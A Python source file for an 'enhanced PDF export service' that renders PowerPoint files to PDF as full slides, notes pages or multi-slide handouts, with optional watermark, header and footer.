# -*- coding: utf-8 -*-
"""
Enhanced PDF Export Service
Supports: Print-optimized PDF, Notes page, Handouts (2/3/6 slides per page),
Custom page sizes, Watermark/Header/Footer
"""

import io
import logging
import os
import textwrap
from typing import Dict, Any, Optional, List
from dataclasses import dataclass
from enum import Enum

logger = logging.getLogger(__name__)

# Page size definitions (in inches)
class PageSize(Enum):
    A4 = ("A4", 8.27, 11.69)
    LETTER = ("Letter", 8.5, 11.0)
    SLIDE_16_9 = ("16:9", 10.0, 5.625)  # Standard 16:9 slide ratio
    SLIDE_4_3 = ("4:3", 10.0, 7.5)       # Standard 4:3 slide ratio

# Handout layouts
class HandoutLayout(Enum):
    ONE_SLIDE = ("1", 1)      # 1 slide per page (full page)
    TWO_SLIDES = ("2", 2)     # 2 slides per page
    THREE_SLIDES = ("3", 3)   # 3 slides per page
    SIX_SLIDES = ("6", 6)    # 6 slides per page (2x3 grid)

@dataclass
class WatermarkSettings:
    """Watermark configuration"""
    enabled: bool = False
    text: str = "CONFIDENTIAL"
    opacity: float = 0.15
    angle: int = 45
    font_size: int = 48
    color: str = "#888888"

@dataclass
class HeaderFooterSettings:
    """Header and footer configuration"""
    enabled: bool = False
    header_text: str = ""
    footer_text: str = ""
    page_number_format: str = "Page {current} of {total}"  # {current}, {total}, {date}
    header_font_size: int = 10
    footer_font_size: int = 10
    font_color: str = "#666666"

@dataclass
class PdfExportOptions:
    """Complete PDF export options"""
    # Layout mode
    mode: str = "slides"  # slides | notes | handout
    
    # Slide layout (for mode=slides)
    page_size: str = "A4"  # A4 | Letter | 16:9 | 4:3 | 1:1 | 9:16
    orientation: str = "landscape"  # portrait | landscape
    aspect_ratio: str = "16:9"  # 16:9 | 4:3 | 1:1 | 9:16
    
    # Notes page (for mode=notes)
    notes_position: str = "below"  # below | right | separate
    notes_font_size: int = 10
    
    # Handout (for mode=handout)
    handout_layout: str = "3"  # 1 | 2 | 3 | 6
    
    # Watermark
    watermark: Optional[WatermarkSettings] = None
    
    # Header/Footer
    header_footer: Optional[HeaderFooterSettings] = None
    
    # Theme
    theme: str = "light"  # light | dark


class EnhancedPdfExportService:
    """Enhanced PDF export using python-pptx and reportlab"""
    
    def __init__(self):
        self._pptx_available = False
        self._reportlab_available = False
        self._pil_available = False
        
        try:
            from pptx import Presentation
            from pptx.util import Inches, Pt, Emu
            from pptx.dml.color import RGBColor
            self._pptx = True
        except ImportError:
            logger.warning("python-pptx not available")
            self._pptx = False
            
        try:
            from reportlab.lib.pagesizes import A4, letter
            from reportlab.lib.units import inch
            from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, PageBreak
            from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
            from reportlab.lib.enums import TA_CENTER, TA_LEFT, TA_RIGHT
            from reportlab.pdfgen import canvas
            from reportlab.pdfbase import pdfmetrics
            from reportlab.pdfbase.ttfonts import TTFont
            self._reportlab = True
        except ImportError:
            logger.warning("reportlab not available")
            self._reportlab = False
            
        try:
            from PIL import Image, ImageDraw, ImageFont
            self._pil = True
        except ImportError:
            logger.warning("PIL not available")
            self._pil = False
    
    def is_available(self) -> bool:
        """Check if all required libraries are available"""
        return self._pptx and (self._reportlab or self._pil)
    
    async def export_pdf(
        self,
        pptx_path: str,
        output_path: str,
        options: PdfExportOptions
    ) -> Dict[str, Any]:
        """
        Export PPTX to enhanced PDF with options.
        
        Args:
            pptx_path: Path to source PPTX file
            output_path: Path to output PDF file
            options: PDF export options
            
        Returns:
            Dict with success status and details
        """
        if not os.path.exists(pptx_path):
            return {"success": False, "error": f"PPTX file not found: {pptx_path}"}
        
        if not self.is_available():
            return {
                "success": False,
                "error": "Required libraries not available",
                "hint": "pip install python-pptx reportlab Pillow"
            }
        
        try:
            if options.mode == "slides":
                return await self._export_slides_mode(pptx_path, output_path, options)
            elif options.mode == "notes":
                return await self._export_notes_mode(pptx_path, output_path, options)
            elif options.mode == "handout":
                return await self._export_handout_mode(pptx_path, output_path, options)
            else:
                return {"success": False, "error": f"Unknown mode: {options.mode}"}
        except Exception as e:
            logger.error(f"PDF export failed: {e}")
            return {"success": False, "error": str(e)}
    
    async def _export_slides_mode(
        self,
        pptx_path: str,
        output_path: str,
        options: PdfExportOptions
    ) -> Dict[str, Any]:
        """Export as full-page slides (1 slide per page, print-optimized)"""
        from pptx import Presentation
        from pptx.enum.util import Cm
        from pptx.util import Inches, Pt, Emu
        from pptx.dml.color import RGBColor
        
        prs = Presentation(pptx_path)
        
        # Determine page size
        width_inches, height_inches = self._get_page_size(options)
        
        # Create PDF using reportlab
        from reportlab.lib.pagesizes import landscape
        from reportlab.lib.units import inch
        from reportlab.pdfgen import canvas
        
        c = canvas.Canvas(output_path, pagesize=landscape(width_inches * inch, height_inches * inch))
        
        slide_count = len(prs.slides)
        
        for idx, slide in enumerate(prs.slides):
            if idx > 0:
                c.showPage()
            
            # Draw slide content
            self._draw_slide_to_canvas(c, slide, width_inches, height_inches, idx, slide_count, options)
        
        c.save()
        return {"success": True, "output_path": output_path, "pages": slide_count}
    
    async def _export_notes_mode(
        self,
        pptx_path: str,
        output_path: str,
        options: PdfExportOptions
    ) -> Dict[str, Any]:
        """Export slides with speaker notes below each slide"""
        from pptx import Presentation
        from pptx.util import Inches, Pt
        from reportlab.lib.pagesizes import A4, letter
        from reportlab.lib.units import inch
        from reportlab.pdfgen import canvas
        from reportlab.pdfbase import pdfmetrics
        from reportlab.pdfbase.ttfonts import TTFont
        
        prs = Presentation(pptx_path)
        
        # Page size for notes
        page_width, page_height = A4 if options.page_size == "A4" else letter
        page_width = page_width[0] if hasattr(page_width, '__getitem__') else page_width
        
        # Try to register Chinese font
        chinese_font = None
        try:
            # Try system Chinese fonts
            for font_path in ['/System/Library/Fonts/PingFang.ttc', '/System/Library/Fonts/STHeiti Light.ttc',
                              '/Library/Fonts/Arial Unicode.ttf']:
                if os.path.exists(font_path):
                    pdfmetrics.registerFont(TTFont('Chinese', font_path))
                    chinese_font = 'Chinese'
                    break
        except Exception:
            pass
        
        c = canvas.Canvas(output_path, pagesize=A4 if options.page_size == "A4" else letter)
        
        slide_count = len(prs.slides)
        
        for idx, slide in enumerate(prs.slides):
            # Draw slide
            self._draw_slide_to_canvas(c, slide, 
                page_width / inch * 0.9,  # slide width in inches (90% of page)
                page_height / inch * 0.5,  # slide height (50% of page)
                idx, slide_count, options,
                offset_y=0)
            
            # Draw notes below slide
            notes_text = ""
            if slide.has_notes_slide:
                notes_frame = slide.notes_slide.notes_text_frame
                notes_text = notes_frame.text if notes_frame else ""
            
            if notes_text or True:  # Always show section for notes
                # Notes area
                notes_y = page_height - (page_height / inch * 0.55) * inch - 20
                
                # Draw separator line
                c.setStrokeColorRGB(0.8, 0.8, 0.8)
                c.line(40, notes_y + 10, page_width - 40, notes_y + 10)
                
                # Notes label
                c.setFont("Helvetica-Bold", 9)
                c.setFillColorRGB(0.4, 0.4, 0.4)
                c.drawString(40, notes_y - 10, "Speaker Notes:")
                
                # Notes content
                font_name = chinese_font if chinese_font else "Helvetica"
                c.setFont(font_name, options.notes_font_size)
                c.setFillColorRGB(0.2, 0.2, 0.2)
                
                # Wrap text
                max_chars_per_line = int((page_width - 80) / (options.notes_font_size * 0.5))
                lines = self._wrap_text(notes_text, max_chars_per_line) if notes_text else ["(No notes)"]
                
                text_y = notes_y - 25
                for line in lines[:20]:  # Max 20 lines of notes
                    if text_y > 40:
                        c.drawString(40, text_y, line)
                        text_y -= options.notes_font_size + 2
                    else:
                        break
            
            # Page number
            c.setFont("Helvetica", 8)
            c.setFillColorRGB(0.5, 0.5, 0.5)
            c.drawRightString(page_width - 40, 20, f"Page {idx + 1} of {slide_count}")
            
            if idx < slide_count - 1:
                c.showPage()
        
        c.save()
        return {"success": True, "output_path": output_path, "pages": slide_count}
    
    async def _export_handout_mode(
        self,
        pptx_path: str,
        output_path: str,
        options: PdfExportOptions
    ) -> Dict[str, Any]:
        """Export as handouts with multiple slides per page"""
        from pptx import Presentation
        from reportlab.lib.pagesizes import A4, letter, landscape
        from reportlab.lib.units import inch
        from reportlab.pdfgen import canvas
        
        prs = Presentation(pptx_path)
        slide_count = len(prs.slides)
        
        # Handout layout: how many slides per page
        slides_per_page = int(options.handout_layout)
        
        # Page setup
        page_size = A4 if options.page_size == "A4" else letter
        page_width, page_height = page_size[0], page_size[1]
        
        # For 6 slides per page, use landscape for better layout
        if slides_per_page == 6:
            page_width, page_height = landscape(page_size)
        
        c = canvas.Canvas(output_path, pagesize=(page_width, page_height))
        
        # Calculate grid layout
        if slides_per_page == 1:
            cols, rows = 1, 1
        elif slides_per_page == 2:
            cols, rows = 1, 2
        elif slides_per_page == 3:
            cols, rows = 1, 3
        elif slides_per_page == 6:
            cols, rows = 2, 3
        else:
            cols, rows = 1, 1
        
        # Margins and spacing
        margin = 0.5 * inch
        gap_x = 0.3 * inch
        gap_y = 0.3 * inch
        
        slide_area_width = (page_width - 2 * margin - (cols - 1) * gap_x) / cols
        slide_area_height = (page_height - 2 * margin - (rows - 1) * gap_y - 0.5 * inch) / rows  # Leave room for page footer
        
        # Process slides in batches
        total_pages = (slide_count + slides_per_page - 1) // slides_per_page
        
        for page_idx in range(total_pages):
            if page_idx > 0:
                c.showPage()
            
            for pos in range(slides_per_page):
                slide_idx = page_idx * slides_per_page + pos
                
                if slide_idx >= slide_count:
                    break
                
                # Calculate position
                col = pos % cols
                row = pos // cols
                
                x = margin + col * (slide_area_width + gap_x)
                y = page_height - margin - (row + 1) * (slide_area_height + gap_y) + gap_y
                
                # Draw slide
                slide = prs.slides[slide_idx]
                self._draw_slide_to_canvas(
                    c, slide,
                    slide_area_width / inch, slide_area_height / inch,
                    slide_idx, slide_count, options,
                    offset_x=x, offset_y=y
                )
                
                # Slide number below each slide
                c.setFont("Helvetica", 8)
                c.setFillColorRGB(0.5, 0.5, 0.5)
                c.drawCentredString(
                    x + slide_area_width / 2,
                    y - 15,
                    f"{slide_idx + 1}"
                )
            
            # Page number at bottom
            c.setFont("Helvetica", 9)
            c.setFillColorRGB(0.4, 0.4, 0.4)
            c.drawCentredString(page_width / 2, 20, f"Page {page_idx + 1} of {total_pages}")
        
        c.save()
        return {"success": True, "output_path": output_path, "pages": total_pages}
    
    def _draw_slide_to_canvas(
        self,
        c,
        slide,
        width_inches: float,
        height_inches: float,
        slide_idx: int,
        total_slides: int,
        options: PdfExportOptions,
        offset_x: float = 0,
        offset_y: float = 0
    ):
        """Draw a single slide to reportlab canvas"""
        from pptx.util import Inches, Pt, Emu
        from pptx.dml.color import RGBColor
        from pptx.enum.shapes import MSO_SHAPE_TYPE
        
        # Fill white background
        c.setFillColorRGB(1, 1, 1)
        c.rect(offset_x, offset_y, width_inches * 72, height_inches * 72, fill=1, stroke=0)
        
        # Draw slide shapes
        for shape in slide.shapes:
            try:
                self._draw_shape_to_canvas(c, shape, width_inches, height_inches, offset_x, offset_y, options)
            except Exception as e:
                logger.debug(f"Could not draw shape: {e}")
        
        # Draw watermark if enabled
        if options.watermark and options.watermark.enabled:
            self._draw_watermark(c, width_inches, height_inches, offset_x, offset_y, options.watermark)
        
        # Draw header/footer if enabled
        if options.header_footer and options.header_footer.enabled:
            self._draw_header_footer(c, width_inches, height_inches, offset_x, offset_y, 
                                    slide_idx, total_slides, options.header_footer)
    
    def _draw_shape_to_canvas(
        self, c, shape, width_inches: float, height_inches: float,
        offset_x: float, offset_y: float, options: PdfExportOptions
    ):
        """Draw a PPTX shape to canvas"""
        from pptx.util import Inches, Pt, Emu
        from pptx.dml.color import RGBColor
        from pptx.enum.shapes import MSO_SHAPE_TYPE
        from PIL import Image
        import io
        
        shape_type = shape.shape_type
        
        # Get shape bounds (convert from EMU to points, then to inches)
        left = shape.left / 914400  # EMU to inches
        top = shape.top / 914400
        shape_width = shape.width / 914400
        shape_height = shape.height / 914400
        
        # Scale to fit target dimensions
        left_px = offset_x * 72 + left * 72
        top_px = offset_y * 72 + top * 72
        width_px = shape_width * 72
        height_px = shape_height * 72
        
        # Handle pictures
        if shape_type == MSO_SHAPE_TYPE.PICTURE:
            try:
                image = shape.image
                img_bytes = image.blob
                img = Image.open(io.BytesIO(img_bytes))
                img_width, img_height = img.size
                
                # Convert to RGB if necessary
                if img.mode != 'RGB':
                    img = img.convert('RGB')
                
                # Save to temp file for reportlab
                import tempfile
                import os as os_module
                temp_fd, temp_path = tempfile.mkstemp(suffix='.png')
                os_module.close(temp_fd)
                img.save(temp_path, 'PNG')
                
                c.drawImage(temp_path, left_px, top_px, width_px, height_px, preserveAspectRatio=True)
                
                try:
                    os_module.remove(temp_path)
                except Exception:
                    pass
            except Exception as e:
                logger.debug(f"Could not draw picture: {e}")
        
        # Handle text boxes
        elif shape.has_text_frame:
            for paragraph in shape.text_frame.paragraphs:
                for run in paragraph.runs:
                    text = run.text
                    if not text:
                        continue
                    
                    try:
                        font_size = run.font.size
                        if font_size:
                            font_size = font_size.pt * 0.75  # Adjust for PDF
                        else:
                            font_size = 12
                        
                        font_bold = run.font.bold
                        font_italic = run.font.italic
                        
                        font_name = "Helvetica"
                        if font_bold and font_italic:
                            font_name = "Helvetica-BoldOblique"
                        elif font_bold:
                            font_name = "Helvetica-Bold"
                        elif font_italic:
                            font_name = "Helvetica-Oblique"
                        
                        # Text color
                        if run.font.color.type == 1:  # RGB
                            rgb = run.font.color.rgb
                            if rgb:
                                r = (rgb >> 16 & 0xFF) / 255
                                g = (rgb >> 8 & 0xFF) / 255
                                b = (rgb & 0xFF) / 255
                                c.setFillColorRGB(r, g, b)
                            else:
                                c.setFillColorRGB(0, 0, 0)
                        else:
                            c.setFillColorRGB(0, 0, 0)
                        
                        c.setFont(font_name, font_size)
                        
                        # Draw text (simplified - doesn't handle wrapping well)
                        # For proper wrapping, use TextObject
                        try:
                            c.drawString(left_px, top_px + height_px - font_size, text[:100])
                        except Exception:
                            pass
                    except Exception as e:
                        logger.debug(f"Could not draw text: {e}")
        
        # Handle simple shapes (rectangles, etc.)
        elif hasattr(shape, 'fill'):
            try:
                fill = shape.fill
                if fill.type is not None:
                    if fill.type == 1:  # Solid
                        rgb = fill.fore_color.rgb
                        if rgb:
                            r = (rgb >> 16 & 0xFF) / 255
                            g = (rgb >> 8 & 0xFF) / 255
                            b = (rgb & 0xFF) / 255
                            c.setFillColorRGB(r, g, b)
                        else:
                            c.setFillColorRGB(0.9, 0.9, 0.9)
                        
                        c.rect(left_px, top_px, width_px, height_px, fill=1, stroke=0)
            except Exception:
                pass
    
    def _draw_watermark(
        self, c, width_inches: float, height_inches: float,
        offset_x: float, offset_y: float, watermark: WatermarkSettings
    ):
        """Draw diagonal watermark text"""
        import math
        
        c.saveState()
        
        # Convert hex color to RGB
        color = watermark.color.lstrip('#')
        r = int(color[0:2], 16) / 255
        g = int(color[2:4], 16) / 255
        b = int(color[4:6], 16) / 255
        
        c.setFillColorRGB(r, g, b)
        c.setFillAlpha(watermark.opacity)
        
        # Calculate diagonal position
        width_pt = width_inches * 72
        height_pt = height_inches * 72
        
        # Center position
        center_x = offset_x * 72 + width_pt / 2
        center_y = offset_y * 72 + height_pt / 2
        
        # Rotate around center
        c.translate(center_x, center_y)
        c.rotate(watermark.angle)
        
        # Draw text
        c.setFont("Helvetica-Bold", watermark.font_size)
        c.drawCentredString(0, 0, watermark.text)
        
        c.restoreState()
    
    def _draw_header_footer(
        self, c, width_inches: float, height_inches: float,
        offset_x: float, offset_y: float,
        slide_idx: int, total_slides: int,
        settings: HeaderFooterSettings
    ):
        """Draw header and footer"""
        from reportlab.lib.utils import simpleSplit
        
        width_pt = width_inches * 72
        height_pt = height_inches * 72
        
        # Convert color
        color = settings.font_color.lstrip('#')
        r = int(color[0:2], 16) / 255
        g = int(color[2:4], 16) / 255
        b = int(color[4:6], 16) / 255
        
        c.setFillColorRGB(r, g, b)
        
        # Header
        if settings.header_text:
            c.setFont("Helvetica", settings.header_font_size)
            header = settings.header_text
            c.drawString(offset_x * 72 + 20, offset_y * 72 + height_pt - settings.header_font_size - 5, header)
        
        # Footer with page number
        if settings.footer_text or settings.page_number_format:
            c.setFont("Helvetica", settings.footer_font_size)
            
            footer_parts = []
            if settings.footer_text:
                footer_parts.append(settings.footer_text)
            
            page_text = settings.page_number_format
            page_text = page_text.replace("{current}", str(slide_idx + 1))
            page_text = page_text.replace("{total}", str(total_slides))
            page_text = page_text.replace("{date}", "")
            footer_parts.append(page_text)
            
            footer = " | ".join(footer_parts)
            c.drawString(offset_x * 72 + 20, offset_y * 72 + 15, footer)
    
    def _get_page_size(self, options: PdfExportOptions) -> tuple:
        """Get page dimensions in inches"""
        # Use aspect_ratio if provided, otherwise fall back to page_size
        ratio = getattr(options, 'aspect_ratio', None) or options.page_size
        
        if ratio == "A4":
            if options.orientation == "portrait":
                return (8.27, 11.69)
            else:
                return (11.69, 8.27)
        elif ratio == "Letter":
            if options.orientation == "portrait":
                return (8.5, 11.0)
            else:
                return (11.0, 8.5)
        elif ratio == "16:9":
            return (13.33, 7.5)  # 16:9 aspect ratio scaled
        elif ratio == "4:3":
            return (10.0, 7.5)
        elif ratio == "1:1":
            # Square 1:1 ratio
            if options.orientation == "portrait":
                return (7.5, 7.5)
            else:
                return (7.5, 7.5)
        elif ratio == "9:16":
            # Vertical 9:16 ratio (mobile/story format)
            if options.orientation == "portrait":
                return (4.5, 8.0)  # portrait mode uses 9:16
            else:
                return (8.0, 4.5)  # landscape mode swaps to 16:9 equivalent
        else:
            return (11.69, 8.27)  # Default A4 landscape
    
    def _wrap_text(self, text: str, max_chars: int) -> List[str]:
        """Simple text wrapping"""
        if not text:
            return []
        words = text.split()
        lines = []
        current_line = []
        current_length = 0
        
        for word in words:
            if current_length + len(word) + 1 <= max_chars:
                current_line.append(word)
                current_length += len(word) + 1
            else:
                if current_line:
                    lines.append(" ".join(current_line))
                current_line = [word]
                current_length = len(word)
        
        if current_line:
            lines.append(" ".join(current_line))
        
        return lines


def get_enhanced_pdf_export_service() -> EnhancedPdfExportService:
    """Get singleton instance"""
    if not hasattr(get_enhanced_pdf_export_service, '_instance'):
        get_enhanced_pdf_export_service._instance = EnhancedPdfExportService()
    return get_enhanced_pdf_export_service._instance
